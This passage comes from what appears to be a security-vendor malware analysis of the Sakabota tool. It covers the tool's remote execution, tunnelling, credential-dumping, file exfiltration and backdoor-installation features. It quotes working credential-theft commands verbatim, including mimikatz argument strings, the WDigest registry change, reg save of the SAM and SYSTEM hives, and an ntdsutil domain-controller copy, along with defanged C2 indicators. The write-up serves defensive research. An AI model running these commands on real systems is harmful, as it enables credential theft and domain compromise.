<p>Sakabota’s remotes tab, seen in Figure 5, is dedicated to providing the actor the ability to interact with remote systems. First, this tab allows the actor to use Windows Management Instrumentation (WMI) to run commands on remote systems, in which the actor would provide the desired command in the ‘Code’ text box. The ‘Code’ text box contains auto-complete suggestions that provides us insight into some of the commands the developer expects the actor to run, such as gathering information on the user and network interfaces; however, the following commands within the auto-complete suggestions (with the exception of <span style="font-family: 'courier new', courier, monospace;">Whoami </span>and <span style="font-family: 'courier new', courier, monospace;">query user</span>) contain errors, such as missing spaces or added spaces or are not valid commands that would result in errors rather than running the application correctly:</p>
<p><span style="font-family: 'courier new', courier, monospace;">Whoami<br />
</span><span style="font-family: 'courier new', courier, monospace;">ipconfig/all<br />
</span><span style="font-family: 'courier new', courier, monospace;">query user<br />
</span><span style="font-family: 'courier new', courier, monospace;">net stat -na<br />
</span><span style="font-family: 'courier new', courier, monospace;">Screen Shot</span></p>
<p>The ‘PSEXEC’ portion of this tab allows the actor to install an embedded PSExec tool to the system and use it to connect to a remote system using supplied credentials. The <span style="font-family: 'courier new', courier, monospace;">Remote</span> button uses PSExec to launch a command prompt process on the remote system, while the <span style="font-family: 'courier new', courier, monospace;">Clean</span> button attempts to kill the process running PSEXESVC.exe and delete this executable on the remote system. The PLink portion of the tab allows an actor to install an embedded PuTTY Link (PLink) tool (SHA256:<br />
<span style="font-family: 'courier new', courier, monospace;">04e5f50dd90d5b88b745ef108c06a3ef1e297018cb3fe8acc80dd55250dfee68</span>) to the system and use it to create an SSH tunnel between the system and an external server over TCP port 3389. We believe the actor uses this tunnel to connect to non-Internet facing systems using RDP. Sakabota uses the <span style="font-family: 'courier new', courier, monospace;">As_backdoor</span> radio box to create a scheduled task named <span style="font-family: 'courier new', courier, monospace;">update.windows</span> that attempts to create the tunnel every 20 minutes, whereas Sakabota uses the <span style="font-family: 'courier new', courier, monospace;">As_System</span> rox to create a scheduled task named <span style="font-family: 'courier new', courier, monospace;">mytask</span> that runs once at 12:00 AM. The actor would provide the location of their server in the <span style="font-family: 'courier new', courier, monospace;">Server IP</span> box that Sakabota will use to create a tunnel to which the developer included the following locations within auto-complete options:</p>
<ul>
<li><span style="font-family: 'courier new', courier, monospace;">176.9.235[.]101</span></li>
<li><span style="font-family: 'courier new', courier, monospace;">pasta58[.]com</span></li>
</ul>
<p>The ‘PASS THE HASH’ portion of the ‘Remotes’ tab suggests that the tool attempts to use the <a href="https://attack.mitre.org/techniques/T1075/">pass-the-hash</a> technique to authenticate to a remote system, however, the tool does not have any functional code that uses these text boxes and the ‘Pass’ button does not have any event handling if its clicked.</p>
<p><img class="wp-image-101784 aligncenter" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/12/word-image-53.png" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/12/word-image-53.png 821w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/12/word-image-53-300x124.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/12/word-image-53-768x316.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/12/word-image-53-370x152.png 370w" sizes="(max-width: 821px) 100vw, 821px" /></p>
<p style="text-align: center;"><em><span style="font-size: 10pt;">Figure 5. Sakabota’s ‘Remotes’ tab</span> </em></p>
<p>Sakabota’s <span style="font-family: 'courier new', courier, monospace;">Passwords</span> tab, seen in Figure 6 has functionality dedicated to dumping credentials from the system. The ‘<span style="font-family: 'courier new', courier, monospace;">MIMI</span>’ portion of this tab allows the actor to load a supplied mimikatz executable and execute it with the arguments ‘<span style="font-family: 'courier new', courier, monospace;">log privilege::debug sekurlsa::logonpasswords exit</span>’. The ‘<span style="font-family: 'courier new', courier, monospace;">Digest</span>’ button allows the actor to attempt to circumvent a Mimikatz mitigation by setting the following registry key to ‘<span style="font-family: 'courier new', courier, monospace;">1</span>’, which instructs Windows to store credentials in memory:</p>
<p><span style="font-family: 'courier new', courier, monospace;">HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential</span></p>
<p>The ‘<span style="font-family: 'courier new', courier, monospace;">SAM</span>’ portion allows an actor to dump the SAM hive from the registry by using either the supplied Mimikatz tool with the arguments ‘<span style="font-family: 'courier new', courier, monospace;">log privilege::debug token::whoami token::elevate lsadump::sam exit</span>’, or by running the following two command-line commands:</p>
<p><span style="font-family: 'courier new', courier, monospace;">Reg save hklm\sam &lt;supplied folder name&gt;\sam<br />
</span><span style="font-family: 'courier new', courier, monospace;">Reg save hklm\system &lt;supplied folder name&gt;\system</span></p>
<p>The ‘<span style="font-family: 'courier new', courier, monospace;">NTDS</span>’ portion allows an actor to obtain a copy of a domain controller by creating an installation media using the ‘<span style="font-family: 'courier new', courier, monospace;">ntdsutil</span>’ application. We have seen adversaries use this technique to create a clone of the domain controller that they exfiltrate for backup and offline processing purposes. The actor will select a folder to save the output and click the ‘SnapShot’ button that will run the following command to take a snapshot of the domain controller:</p>
<p><span style="font-family: 'courier new', courier, monospace;">ntdsutil &#8220;activate instance ntds&#8221; ifm &#8220;create full &lt;actor provided path&gt;\ntds&#8221; quit quit</span></p>
<p>&nbsp;</p>
<p><img class="wp-image-101786 aligncenter" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/12/word-image-54.png" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/12/word-image-54.png 817w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/12/word-image-54-300x124.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/12/word-image-54-768x317.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/12/word-image-54-370x153.png 370w" sizes="(max-width: 817px) 100vw, 817px" /></p>
<p style="text-align: center;"><em><span style="font-size: 10pt;">Figure 6. Sakabota’s ‘Passwords’ tab</span> </em></p>
<p>The ‘<span style="font-family: 'courier new', courier, monospace;">File MNG</span>’ tab seen in Figure 7 allows the actor to interact directly with the filesystem to create RAR archives of files and folders and to upload specific files to the C2 via FTP. The ‘RAR’ portion allows the actor to select a folder to archive its files by first saving an embedded ‘rar.exe’ (SHA256: <span style="font-family: 'courier new', courier, monospace;">ea139458b4e88736a3d48e81569178fd5c11156990b6a90e2d35f41b1ad9bac1</span>) to the system as “R.exe” and runs ‘c<span style="font-family: 'courier new', courier, monospace;">d</span> <span style="font-family: 'courier new', courier, monospace;">&lt;Read text box&gt; &amp; R.exe a -r -v &lt;Size text box&gt; &lt;Write text box&gt;’</span>. The ‘<span style="font-family: 'courier new', courier, monospace;">FTP</span>’ portion of the tab allows the actor to select files from the system to upload to its C2 server hosted at ‘<span style="font-family: 'courier new', courier, monospace;">pasta58[.]com</span>’ over FTP. Table 3 shows the functionality that the various radio and checkboxes enable if selected in the FTP section. The ‘<span style="font-family: 'courier new', courier, monospace;">B64</span>’ section is meant to allow the actor to base64 encode and decode files on the system; however, it’s functionality does not seem to work appropriately. The dropdown has two options: ‘<span style="font-family: 'courier new', courier, monospace;">CERT</span>’ and ‘<span style="font-family: 'courier new', courier, monospace;">STD</span>’ with the former using the legitimate Microsoft ‘certutil’ application to encode or decode the file while the latter uses the ToBase64String and FromBase64String methods within the System.Convert class. Neither the ‘<span style="font-family: 'courier new', courier, monospace;">CERT</span>’ and ‘<span style="font-family: 'courier new', courier, monospace;">STD</span>’ options work correctly, with the ‘<span style="font-family: 'courier new', courier, monospace;">STD</span>’ option having the same exact code used for the encode and decode buttons. The ‘<span style="font-family: 'courier new', courier, monospace;">STD</span>’ method is quite interesting, as both the ‘Encode’ and ‘Decode’ buttons read the file contents and encode them by calling the ToBase64String method, but then immediately calls FromBase64String on the encoded contents, which effectively results in the cleartext of the file. We are unsure of the purpose of this functionality, as it appears to be a coding error made by the developer.</p>
<table style="height: 254px; width: 99.6931%;">
<tbody>
<tr>
<td style="width: 32.5153%;"><strong>Checkbox</strong></td>
<td style="width: 121.543%;"><strong>Description</strong></td>
</tr>
<tr>
<td style="width: 32.5153%;">SYS</td>
<td style="width: 121.543%;">Writes paths to selected files to &#8216;List.txt&#8217; and creates a scheduled task named &#8216;mytask&#8217; to run the Sakabota executable with the &#8216;-up-l List.txt&#8217;</td>
</tr>
<tr>
<td style="width: 32.5153%;">CMD</td>
<td style="width: 121.543%;">Creates a scheduled task named &#8216;mytask&#8217; to run a batch script &#8220;c:\FOPO.bat&#8221; that saves FTP commands to &#8216;ftpcmd.dat&#8217; to upload the selected files</td>
</tr>
<tr>
<td style="width: 32.5153%;">NOR</td>
<td style="width: 121.543%;">Normal FTP upload</td>
</tr>
<tr>
<td style="width: 32.5153%;">KWF</td>
<td style="width: 121.543%;">Abbreviation for “Kill When Finished”, which exits the Sakabota application after uploading the files</td>
</tr>
<tr>
<td style="width: 32.5153%;">DEL</td>
<td style="width: 121.543%;">Deletes the file after uploading</td>
</tr>
</tbody>
</table>
<p style="text-align: center;"><span style="font-size: 10pt;"><em>Table 3. Radio and Checkboxes and their functionality in the ‘FTP’ section of Sakabota</em></span></p>
<p><img class="wp-image-101788 aligncenter" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/12/word-image-55.png" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/12/word-image-55.png 817w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/12/word-image-55-300x124.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/12/word-image-55-768x319.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/12/word-image-55-370x154.png 370w" sizes="(max-width: 817px) 100vw, 817px" /></p>
<p style="text-align: center;"><em><span style="font-size: 10pt;">Figure 7. Sakabota’s ‘File MNG’ tab</span> </em></p>
<p>Sakabota’s ‘<span style="font-family: 'courier new', courier, monospace;">Resources</span>’ tab seen in Figure 8 has two buttons ‘<span style="font-family: 'courier new', courier, monospace;">Shell</span>’ and ‘<span style="font-family: 'courier new', courier, monospace;">Agent</span>’ that install a webshell and PowerShell backdoor, respectively.</p>
<p><img class="wp-image-101790 aligncenter" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/12/word-image-56.png" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/12/word-image-56.png 818w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/12/word-image-56-300x125.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/12/word-image-56-768x319.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/12/word-image-56-370x154.png 370w" sizes="(max-width: 818px) 100vw, 818px" /></p>
<p style="text-align: center;"><span style="font-size: 10pt;"><em>Figure 8. Sakabota’s ‘Resources’ tab</em></span></p>
<p>The webshell is in the Sakabota binary within a resource named ‘Shell’ (SHA256:<br />
b2fb0da6832e554194b59c817922770af13d474179a1c0381809676ef2709d24) and is meant for the actor to install on an IIS server running ASP.NET, as the webshell was written in C#. By clicking the button, Sakabota will write the embedded Shell to a filenamed ‘<span style="font-family: 'courier new', courier, monospace;">Shell.aspx’</span>, which the actor would then have to move to an IIS directory. The webshell requires authentication before the actor to run commands and upload files to the web server. The authentication process involves checking the MD5 hash of the string in the ‘id’ parameter of the URL with a hardcoded MD5 hash ‘6242182812353019113116910419137224228’ in the webshell. This authentication process is flawed and cannot work, as the hardcoded MD5 hash is not valid as it contains 37 characters instead of 32, so the actor cannot authenticated to the shell and is therefore unusable in its current form. Figure 9 shows the webshell’s interface, which we had to remove the webshell’s authentication mechanism to display.</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/12/Figure-9.-Interface-of-webshell-embedded-within-Sakabota’s-‘Resources’-tab-2.png" rel="wpdevart_lightbox"><img class="aligncenter wp-image-101854 size-large" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/12/Figure-9.-Interface-of-webshell-embedded-within-Sakabota’s-‘Resources’-tab-2-1024x162.png" alt="" width="1024" height="162" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/12/Figure-9.-Interface-of-webshell-embedded-within-Sakabota’s-‘Resources’-tab-2-1024x162.png 1024w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/12/Figure-9.-Interface-of-webshell-embedded-within-Sakabota’s-‘Resources’-tab-2-300x47.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/12/Figure-9.-Interface-of-webshell-embedded-within-Sakabota’s-‘Resources’-tab-2-768x121.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/12/Figure-9.-Interface-of-webshell-embedded-within-Sakabota’s-‘Resources’-tab-2-1536x242.png 1536w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/12/Figure-9.-Interface-of-webshell-embedded-within-Sakabota’s-‘Resources’-tab-2-2048x323.png 2048w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/12/Figure-9.-Interface-of-webshell-embedded-within-Sakabota’s-‘Resources’-tab-2-900x142.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/12/Figure-9.-Interface-of-webshell-embedded-within-Sakabota’s-‘Resources’-tab-2-370x58.png 370w" sizes="(max-width: 1024px) 100vw, 1024px" /></a></p>
<p style="text-align: center;"><span style="font-size: 10pt;"><em>Figure 9. Interface of webshell embedded within Sakabota’s ‘Resources’ tab</em></span></p>
<p>When the actor clicks the <span style="font-family: 'courier new', courier, monospace;">Agent</span> button, Sakabota saves an embedded executable from within a resource named <span style="font-family: 'courier new', courier, monospace;">svhost</span> to <span style="font-family: 'courier new', courier, monospace;">svhost.exe</span>. This executable (SHA256:<br />
<span style="font-family: 'courier new', courier, monospace;">ffe2e9b274b00ea967c96eca9c177048c35de75599488f1b8be5ae1cceba00d9</span>) installs a PowerShell based backdoor called CASHY200, which we covered in detail in a previous blog regarding the <a href="https://unit42.paloaltonetworks.com/more-xhunt-new-powershell-backdoor-blocked-through-dns-tunnel-detection/">xHunt campaign</a>.</p>
<p>The <span style="font-family: 'courier new', courier, monospace;">Web Browser</span> tab seen in Figure 10 is rather interesting, as it does not have any buttons or the ability to actually browse the Internet. It is likely that this tab is an artifact of prior versions of Sakabota, but we are unsure why the developer would have removed the browsing functionality without removing the tab in its entirety.</p>
<p><img class="wp-image-101794 aligncenter" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/12/word-image-58.png" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/12/word-image-58.png 819w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/12/word-image-58-300x124.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/12/word-image-58-768x317.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/12/word-image-58-370x153.png 370w" sizes="(max-width: 819px) 100vw, 819px" /></p>
<p style="text-align: center;"><span style="font-size: 10pt;"><em>Figure 10. Sakabota’s unsupported web browser tab</em></span></p>
<p>&nbsp;</p>
          <div class="article__subscribe mb-40 text-gray-400 bg-gray-200 rounded-lg">
  <h4 class="h3 mb-10 text-black">Get updates from <br class="d-sm-none"> Palo Alto<br class="d-sm-none"> Networks!</h4>
  <p>Sign up to receive the latest news, cyber threat intelligence and research from us</p>
  <!-- <form action="https://app-guse4001.marketo.com/index.php/leadCapture/save2" method="post" novalidate class="subscribe-form py-25" name="Unit42_Subscribe"> -->
  <form action="https://start.paloaltonetworks.com/index.php/leadCapture/save2" method="post" novalidate class="subscribe-form py-25" name="Unit42_Subscribe">
    <input type="hidden" value="1086" name="formid">
    <!-- <input type="hidden" value="818-CZC-273" name="munchkinId"> -->
    <input type="hidden" value="531-OCS-018" name="munchkinId">
    <input type="hidden" value="2141" name="lpId">
    <input type="hidden" value="1086" name="formVid">
    <input type="hidden" name="mkto_optinunit42" value="true">
    <input type="hidden" name="mkto_opt-in" value="true">
    <div class="row">
      <div class="col-sm col-12 mb-sm-0 mb-15">
        <input type="email" name="Email" placeholder="Email address" class="subscribe-field d-block w-100 px-sm-25 px-15 bg-white">
        <p class="error-mail d-none mt-15 text-danger" style="color: #dc3545">Please enter your email address!</p>
      </div>
      <div class="col-sm-auto col-12">
          <input type="submit" value="Subscribe" class="btn btn--black btn--sm w-100" disabled="disabled">
      </div>
    </div>

    <div class="google-recapth mt-15">
      <div class="g-recaptcha" data-expired-callback="captchaExpires" data-callback="captchaComplete" data-sitekey="6LfKOrwUAAAAAOwgjxrEcx-pcfwe8OquUw6ommTK"></div>
      <p class="error-recaptcha d-none mt-15 text-danger" style="color: #dc3545">Please mark, I'm not a robot!</p>
    </div>
  </form>

  <div class="font-size-ex-sm col-sm-7 p-0">
    <p>By submitting this form, you agree to our <a href="https://www.paloaltonetworks.com/legal-notices/terms-of-use">Terms of Use</a> and acknowledge our <a href="https://www.paloaltonetworks.com/legal-notices/privacy">Privacy Statement</a>.</p>
  </div>
</div>

<script type="text/javascript" src="https://researchcenter.paloaltonetworks.com/wp-content/plugins/google-analyticator/external-tracking.min.js?ver=6.4.9"></script>
        </div>
      </div>
    </div>
  </article>
<footer class="site-footer px-sm-0 px-15">
  <div class="pt-40">
    <div class="container pt-sm-30">
      <div class="row justify-content-lg-center">
        <div class="col-lg-11 col-12">
          <div class="row">
            <div class="col-lg-4 col-sm-3 col-12 order-sm-2">
              <nav class="footer-socials mb-sm-0 mb-25 text-white text-sm-right">
                                                <a href="https://twitter.com/Unit42_Intel" target="_blank"><span class="ui ui-4"></span></a>
                <a href="https://github.com/pan-unit42" target="_blank"><span class="ui ui-5"></span></a>
              </nav>
            </div>

            <div class="col-lg-8 col-sm-9 col-12 order-sm-1">
              <div class="row">
                <div class="col-sm col-12 footer-widget widget_nav_menu"><h4 class="h6 mb-15 font-weight-black">Popular Resources</h4><div class="menu-footer-company-phase-container"><ul id="menu-footer-company-phase" class="menu"><li id="menu-item-97096" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97096"><a target="_blank" href="https://www.paloaltonetworks.com/resources">Resource Center</a></li>
<li id="menu-item-97097" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97097"><a target="_blank" href="https://researchcenter.paloaltonetworks.com/">Blog</a></li>
<li id="menu-item-97098" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97098"><a target="_blank" href="https://www.paloaltonetworks.com/communities">Communities</a></li>
<li id="menu-item-97099" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97099"><a target="_blank" href="https://docs.paloaltonetworks.com/">Tech Docs</a></li>
<li id="menu-item-97100" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-97100"><a href="https://unit42.paloaltonetworks.com/">Unit 42</a></li>
<li id="menu-item-97101" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97101"><a target="_blank" href="https://www.paloaltonetworks.com/sitemap">Sitemap</a></li>
</ul></div></div><div class="col-sm col-12 footer-widget widget_nav_menu"><h4 class="h6 mb-15 font-weight-black">Legal Notices</h4><div class="menu-footer-legal-notices-phase-container"><ul id="menu-footer-legal-notices-phase" class="menu"><li id="menu-item-97093" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97093"><a target="_blank" href="https://www.paloaltonetworks.com/legal-notices/privacy">Privacy</a></li>
<li id="menu-item-97094" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97094"><a target="_blank" href="https://www.paloaltonetworks.com/legal-notices/terms-of-use">Terms of Use</a></li>
<li id="menu-item-97095" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97095"><a target="_blank" href="https://www.paloaltonetworks.com/legal">Documents</a></li>
</ul></div></div><div class="col-sm col-12 footer-widget widget_nav_menu"><h4 class="h6 mb-15 font-weight-black">Account</h4><div class="menu-footer-trending-topics-phase-container"><ul id="menu-footer-trending-topics-phase" class="menu"><li id="menu-item-97102" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97102"><a href="https://start.paloaltonetworks.com/preference-center">Manage Subscriptions</a></li>
<li id="menu-item-97103" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97103"><a href="#">&nbsp;</a></li>
<li id="menu-item-97104" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97104"><a href="https://www.paloaltonetworks.com/security-disclosure">Report a Vulnerability</a></li>
</ul></div></div>              </div>
            </div>
          </div>

          
            <div class="copyrights py-25 mt-40">
               <p>© 2020 Palo Alto Networks, Inc. All rights reserved.</p>
            </div>
          
        </div>
      </div>
    </div>
  </div>
</footer>
    <script type="text/javascript">
	var isProcessing = false; 
    function alter_ul_post_values(obj,post_id,ul_type){
	
		if (isProcessing)    
		return;  
		isProcessing = true;   
		
		jQuery(obj).find("span").html("..");
                jQuery.ajax({
                    type: "POST",
                    url: "https://unit42.paloaltonetworks.com/wp-content/plugins/like-dislike-counter-for-posts-pages-and-comments/ajax_counter.php",
                    data: "post_id="+post_id+"&up_type="+ul_type,
                    success: function(msg){
                            jQuery(obj).find("span").html(msg);
                            isProcessing = false; 
                            jQuery(obj).find('svg').children('path').attr('stroke','#0050FF');
                            jQuery(obj).removeClass('idc_ul_cont_not_liked idc_ul_cont_not_liked_inner');
                    }
 		});
	}
	</script>
            <script type="text/javascript">
            (function(){
                document.addEventListener('DOMContentLoaded', function(){
                    let wpp_widgets = document.querySelectorAll('.popular-posts-sr');

                    if ( wpp_widgets ) {
                        for (let i = 0; i < wpp_widgets.length; i++) {
                            let wpp_widget = wpp_widgets[i];
                            WordPressPopularPosts.theme(wpp_widget);
                        }
                    }
                });
            })();
        </script>
                <script>
            var WPPImageObserver = null;

            function wpp_load_img(img) {
                if ( ! 'imgSrc' in img.dataset || ! img.dataset.imgSrc )
                    return;

                img.src = img.dataset.imgSrc;

                if ( 'imgSrcset' in img.dataset ) {
                    img.srcset = img.dataset.imgSrcset;
                    img.removeAttribute('data-img-srcset');
                }

                img.classList.remove('wpp-lazyload');
                img.removeAttribute('data-img-src');
                img.classList.add('wpp-lazyloaded');
            }

            function wpp_observe_imgs(){
                let wpp_images = document.querySelectorAll('img.wpp-lazyload'),
                    wpp_widgets = document.querySelectorAll('.popular-posts-sr');

                if ( wpp_images.length || wpp_widgets.length ) {
                    if ( 'IntersectionObserver' in window ) {
                        WPPImageObserver = new IntersectionObserver(function(entries, observer) {
                            entries.forEach(function(entry) {
                                if (entry.isIntersecting) {
                                    let img = entry.target;
                                    wpp_load_img(img);
                                    WPPImageObserver.unobserve(img);
                                }
                            });
                        });

                        if ( wpp_images.length ) {
                            wpp_images.forEach(function(image) {
                                WPPImageObserver.observe(image);
                            });
                        }

                        if ( wpp_widgets.length ) {
                            for (var i = 0; i < wpp_widgets.length; i++) {
                                let wpp_widget_images = wpp_widgets[i].querySelectorAll('img.wpp-lazyload');

                                if ( ! wpp_widget_images.length && wpp_widgets[i].shadowRoot ) {
                                    wpp_widget_images = wpp_widgets[i].shadowRoot.querySelectorAll('img.wpp-lazyload');
                                }

                                if ( wpp_widget_images.length ) {
                                    wpp_widget_images.forEach(function(image) {
                                        WPPImageObserver.observe(image);
                                    });
                                }
                            }
                        }
                    } /** Fallback for older browsers */
                    else {
                        if ( wpp_images.length ) {
                            for (var i = 0; i < wpp_images.length; i++) {
                                wpp_load_img(wpp_images[i]);
                                wpp_images[i].classList.remove('wpp-lazyloaded');
                            }
                        }

                        if ( wpp_widgets.length ) {
                            for (var j = 0; j < wpp_widgets.length; j++) {
                                let wpp_widget = wpp_widgets[j],
                                    wpp_widget_images = wpp_widget.querySelectorAll('img.wpp-lazyload');

                                if ( ! wpp_widget_images.length && wpp_widget.shadowRoot ) {
                                    wpp_widget_images = wpp_widget.shadowRoot.querySelectorAll('img.wpp-lazyload');
                                }

                                if ( wpp_widget_images.length ) {
                                    for (var k = 0; k < wpp_widget_images.length; k++) {
                                        wpp_load_img(wpp_widget_images[k]);
                                        wpp_widget_images[k].classList.remove('wpp-lazyloaded');
                                    }
                                }
                            }
                        }
                    }
                }
            }

            document.addEventListener('DOMContentLoaded', function() {
                wpp_observe_imgs();

                // When an ajaxified WPP widget loads,
                // Lazy load its images
                document.addEventListener('wpp-onload', function(){
                    wpp_observe_imgs();
                });
            });
        </script>
        <link rel='stylesheet' id='wpdevart_lightbox_front_end_css-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/lightbox-popup/includes/style/wpdevart_lightbox_front.css?ver=5.4.1' type='text/css' media='all' />
<link rel='stylesheet' id='wpdevart_lightbox_effects-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/lightbox-popup/includes/style/effects_lightbox.css?ver=5.4.1' type='text/css' media='all' />
<script type='text/javascript' src='https://www.google.com/recaptcha/api.js'></script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/dist/scripts/main.js'></script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-includes/js/wp-embed.min.js?ver=5.4.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var wpdevart_lb_variables = {"eneble_lightbox_content":"enable","overlay_transparency_prancent":"80","popup_background_color":"#000000","popup_loading_image":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/popup_loading.png","popup_initial_width":"350","popup_initial_height":"300","popup_youtube_width":"640","popup_youtube_height":"410","popup_vimeo_width":"500","popup_vimeo_height":"410","popup_max_width":"5000","popup_max_height":"5000","popup_position":"5","popup_fixed_position":"true","popup_outside_margin":"0","popup_border_width":"2","popup_border_color":"#000000","popup_border_radius":"10","control_buttons_show":"true","control_buttons_show_in_content":"false","control_buttons_height":"30","control_buttons_line_bg_color":"#000000","control_button_prev_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/prev.png","control_button_prev_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/prev_hover.png","control_button_next_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/next.png","control_button_next_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/next_hover.png","control_button_download_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/download.png","control_button_download_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/download_hover.png","control_button_innewwindow_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/innewwindow.png","control_button_innewwindow_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/innewwindow_hover.png","control_button_fullwidth_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidth.png","control_button_fullwidht_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidth_hover.png","control_button_fullwidthrest_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidthreset.png","control_button_fullwidhtrest_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidthreset_hover.png","control_button_close_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/close.png","control_button_close_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/close_hover.png","information_panel_show":"false","information_panel_show_in_content":"false","information_panel_bg_color":"#000000","information_panel_default_transparency":"100","information_panel_hover_trancparency":"100","information_panel_count_image_after_text":"Image","information_panel_count_image_middle_text":"of","information_panel_count_padding_left":"15","information_panel_count_padding_right":"4","information_panel_count_font_size":"20","information_panel_desc_padding_left":"15","information_panel_desc_padding_right":"4","information_panel_desc_font_size":"20","information_panel_desc_show_if_not":"true","information_panel_text_for_no_caption":"No Caption","information_panel_title_padding_left":"5","information_panel_title_padding_right":"5","information_panel_title_font_size":"15","information_panel_title_show_if_not":"true","information_panel_text_for_no_title":"No Title","information_panel_ordering":"{\"count\":[1,\"count\"],\"title\":[0,\"title\"],\"caption\":[0,\"caption\"]}"};
/* ]]> */
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/lightbox-popup/includes/javascript/wpdevart_lightbox_front.js?ver=1.0'></script>
          
  </body>
</html>
